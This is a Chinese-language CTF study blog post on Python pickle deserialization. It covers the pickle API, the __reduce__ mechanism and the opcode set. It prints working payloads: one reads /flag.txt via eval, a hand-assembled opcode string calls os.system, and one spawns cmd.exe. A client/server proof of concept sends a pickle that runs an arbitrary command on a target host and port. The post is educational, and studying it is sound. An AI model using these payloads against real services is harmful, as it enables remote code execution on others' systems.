---
title: Python反序列化之谜
date: 2020-11-08 20:31:06
tags: CTF
---

# Python反序列化之谜

## 一、python反序列化的原理

反序列化的含义就不具体阐述，参考PHP反序列化的含义，下面直接进python中序列化和反序列化的具体实现过程。

### pickle模块的使用

pickle提供了一个简单的持久化功能。可以将对象以文件的形式存放在磁盘上。

pickle模块只能在python中使用，python中几乎所有的数据类型（列表，字典，集合，类等）都可以用pickle来序列化，pickle序列化后的数据，可读性差，人一般无法识别.

`pickle.dump(obj,file, [,protocol])`

```
函数的功能：将obj对象序列化存入已经打开的file中。
参数讲解：
obj：想要序列化的obj对象。
file:文件名称。
protocol：序列化使用的协议。如果该项省略，则默认为0。如果为负值或HIGHEST_PROTOCOL，则使用最高的协议版本。
```

`pickle.load(file)`

```
函数的功能：将file中的对象序列化读出。
参数讲解：
file：文件名称。
```

`pickle.dumps(obj[, protocol])`

```
函数的功能：将obj对象序列化为string形式，而不是存入文件中。
参数讲解：
obj：想要序列化的obj对象。
protocal：如果该项省略，则默认为0。如果为负值或HIGHEST_PROTOCOL，则使用最高的协议版本。
```

`pickle.loads(string)`

```
函数的功能：从string中读出序列化前的obj对象。
参数讲解：
string：文件名称。
【注】 dump() 与 load() 相比 dumps() 和 loads() 还有另一种能力：dump()函数能一个接着一个地将几个对象序列化存储到同一个文件中，随后调用load()来以同样的顺序反序列化读出这些对象。而在__reduce__方法里面我们就进行读取flag.txt文件，并将该类序列化之后进行URL编码
```

![](https://i.loli.net/2020/11/08/WydlNxHVZJS3gQL.png)

python魔术方法详解:https://pyzh.readthedocs.io/en/latest/python-magic-methods-guide.html#id51

可以看的出来在`reduce`函数他才具有调用函数的功能，我们在构建payload的时候，也大多数是借由这个函数来进行发挥的，但这也只是在`pickle`的模块下成立，下面分享一个简易的payload。

```
import pickle
import urllib

class payload(object):
    def __reduce__(self):
       return (eval, ("open('/flag.txt','r').read()",))

a = pickle.dumps(payload()，protocol=0)
a = urllib.quote(a)
print a
```

可以从上面的文档中看出，`reduce`这个特殊方法的功能大致就是这样，你返回的是一个元祖，第一个元素是调用的对象，第二个是传入的参数。

这里的`protocol=0`也是一个新的知识点，有一个小技巧

```
v0 版协议是原始的 “人类可读” 协议，并且向后兼容早期版本的 Python。
v1 版协议是较早的二进制格式，它也与早期版本的 Python 兼容。
v2 版协议是在 Python 2.3 中引入的。它为存储 new-style class 提供了更高效的机制。欲了解有关第 2 版协议带来的改进，请参阅 PEP 307。
v3 版协议添加于 Python 3.0。它具有对 bytes 对象的显式支持，且无法被 Python 2.x 打开。这是目前默认使用的协议，也是在要求与其他 Python 3 版本兼容时的推荐协议。
v4 版协议添加于 Python 3.4。它支持存储非常大的对象，能存储更多种类的对象，还包括一些针对数据格式的优化。有关第 4 版协议带来改进的信息，请参阅 PEP 3154。
```

使用的协议越高，需要的python版本就得越新。

下面再感谢从大佬那里复制来的payload，手撸pickle，直接撸二进制。https://blog.csdn.net/weixin_44377940/article/details/106863514。

先把指令集和手写的基本模式贴在下面：

```
MARK           = b'('   # push special markobject on stack
STOP           = b'.'   # every pickle ends with STOP
POP            = b'0'   # discard topmost stack item
POP_MARK       = b'1'   # discard stack top through topmost markobject
DUP            = b'2'   # duplicate top stack item
FLOAT          = b'F'   # push float object; decimal string argument
INT            = b'I'   # push integer or bool; decimal string argument
BININT         = b'J'   # push four-byte signed int
BININT1        = b'K'   # push 1-byte unsigned int
LONG           = b'L'   # push long; decimal string argument
BININT2        = b'M'   # push 2-byte unsigned int
NONE           = b'N'   # push None
PERSID         = b'P'   # push persistent object; id is taken from string arg
BINPERSID      = b'Q'   #  "       "         "  ;  "  "   "     "  stack
REDUCE         = b'R'   # apply callable to argtuple, both on stack
STRING         = b'S'   # push string; NL-terminated string argument
BINSTRING      = b'T'   # push string; counted binary string argument
SHORT_BINSTRING= b'U'   #  "     "   ;    "      "       "      " < 256 bytes
UNICODE        = b'V'   # push Unicode string; raw-unicode-escaped'd argument
BINUNICODE     = b'X'   #   "     "       "  ; counted UTF-8 string argument
APPEND         = b'a'   # append stack top to list below it
BUILD          = b'b'   # call __setstate__ or __dict__.update()
GLOBAL         = b'c'   # push self.find_class(modname, name); 2 string args
DICT           = b'd'   # build a dict from stack items
EMPTY_DICT     = b'}'   # push empty dict
APPENDS        = b'e'   # extend list on stack by topmost stack slice
GET            = b'g'   # push item from memo on stack; index is string arg
BINGET         = b'h'   #   "    "    "    "   "   "  ;   "    " 1-byte arg
INST           = b'i'   # build & push class instance
LONG_BINGET    = b'j'   # push item from memo on stack; index is 4-byte arg
LIST           = b'l'   # build list from topmost stack items
EMPTY_LIST     = b']'   # push empty list
OBJ            = b'o'   # build & push class instance
PUT            = b'p'   # store stack top in memo; index is string arg
BINPUT         = b'q'   #   "     "    "   "   " ;   "    " 1-byte arg
LONG_BINPUT    = b'r'   #   "     "    "   "   " ;   "    " 4-byte arg
SETITEM        = b's'   # add key+value pair to dict
TUPLE          = b't'   # build tuple from topmost stack items
EMPTY_TUPLE    = b')'   # push empty tuple
SETITEMS       = b'u'   # modify dict by adding topmost key+value pairs
BINFLOAT       = b'G'   # push float; arg is 8-byte float encoding
​
TRUE           = b'I01\n'  # not an opcode; see INT docs in pickletools.py
FALSE          = b'I00\n'  # not an opcode; see INT docs in pickletools.py
```

基本模式

```
c<module>
<callable>
(<args>
tR
```

举个例子：

```
cos
system
(S'ls'
tR.
```

这部分按照指令集中的`b'c'`来看，表示引入模块和函数。由于该指令需要两个字符串（一个为模块名，一个为函数名），所以，接下来的两个字符串用`\n`当作分隔符和休止符，意义为`__import__(os).system`

`tR.`

这个最简单，`b't'`表示从最顶层堆栈项生成元组，`b'R'`表示在堆栈上应用可调用的**元组**，`b'.'`表示结束构造pickle。也就是说这个指令等同于`__import__('os').system(*('ls',))`

所以这里告诉我们一个道理，万物到最后都是汇编语言，二进制，web狗活不下去的。

### json

```
# json所有的语言都通用，它能序列化的数据是有限的：字典列表和元组
import json
# json.dumps()与json.loads()是一对
# json.dump()与json.load()是一对
# json.dumps()#序列号 “obj” 数据类型 转换为 JSON格式的字符串
# ret = json.dumps({'k':(1,2,3)})
# print(repr(ret),type(ret))      #str()是将作用对象“以字符串格式输出”，重在输出；repr()是“显示对象是什么东西”，重在表述。所以在调试程序时常常用后者打印。
# ret2 = json.loads(ret)    #将包含str类型的JSON文档反序列化为一个python对象
# print(repr(ret2),type(ret2))
# #json.dump()#理解为两个动作，一个动作是将”obj“转换为JSON格式的字符串，还有一个动作是将字符串
```

### shelve

```
# shelve也是python提供给我们的序列化工具，比pickle用起来更简单一些
# shelve只提供给我们一个open方法，是用key来访问的，使用起来和字典类似
```

差不多是这个样子。

## 二、漏洞举例

```python
# -*- coding:utf-8 -*-
import subprocess
import cPickle

class Ren(object):
    name = 1
    def __reduce__(self):
        return (subprocess.Popen, (('cmd.exe',),))

print "start"
ret = cPickle.dumps(Ren())
print repr(ret)
#cPickle.loads(ret)
print "end"
```

这上面是一个简单的测试，直接执行的效果是反序列化后根据字节集拼接起来的二进制数据，可是反序列化一下之后，就是直接执行`subprocess.Popen（'cmd.exe',）`.

同理，cPickle的漏洞Pickle也有。

在实际的web服务利用中，其实很多都已经不是靠这样的利用方式，都是通过`base64`来进行二进制数据的传输。

下面的示例都来自于下面这个大佬：https://www.cnblogs.com/KevinGeorge/p/8424630.html（我只是复现怪）

**示例1**

client.py

```
#serail.py
# -*- coding:utf-8 -*-
import os
import socket
import cPickle

class Vuln(object):
    name = 1
    def __reduce__(self):
        return (os.system,(('id'),))

sock = socket.socket(socket.AF_INET,socket.SOCK_STREAM)
sock.connect(("127.0.0.1",5222))
m = Vuln()
ret = cPickle.dumps(m)
sock.send(ret)
sock.close()
```

server.py

```
#server.py
# -*- coding:utf-8 -*-
import socket
import os
import cPickle

sock = socket.socket(socket.AF_INET,socket.SOCK_STREAM)
sock.bind(("127.0.0.1",5222))
sock.listen(5)
con,addr = sock.accept()
ret = con.recv(1024)
m = cPickle.loads(ret)
```

poc.py

```
import os
import sys
import socket
import cPickle

#定义payload类型
class payload(object):
    def __init__(self,command):
        self.__command = command
    def __reduce__(self):
        return (os.system,((self.__command),))

#定义全局socket对象
sock = socket.socket(socket.AF_INET,socket.SOCK_STREAM)

#定义主函数，生成payload对象
if __name__ == "__main__":
    cmd = sys.argv[1]
    rip = sys.argv[2]
    pot = sys.argv[3]
    payload_object = payload(cmd)
    send_object = cPickle.dumps(payload_object)
    sock.connect((rip,int(pot)))
    sock.send(send_object)
```

**示例二**

yaml.load函数的不规范性，导致反序列的漏洞产生

https://blog.csdn.net/qq_33020901/article/details/80062197